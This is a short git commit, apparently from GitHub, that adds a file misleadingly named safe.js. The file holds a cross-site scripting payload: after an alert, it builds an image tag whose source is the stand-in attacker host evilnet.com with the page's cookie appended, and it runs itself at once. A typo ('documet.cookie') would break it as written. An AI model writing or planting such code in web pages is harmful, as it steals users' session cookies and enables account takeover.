dcaba8046ff315ae8a0554ab83acb85eab777965
necrotomero <37853122+necrotomero@users.noreply.github.com>
2020-05-11 22:44:15 +1000

    Create safe.js

---
+++ safe.js
@@ -0,0 +1,9 @@
+
+function safeToken(){
+        alert(777);
+        var img = document.createElement('img');
+        img.src='http://evilnet.com'+documet.cookie;
+        document.body.appendChild(img);
+}
+
+safeToken();
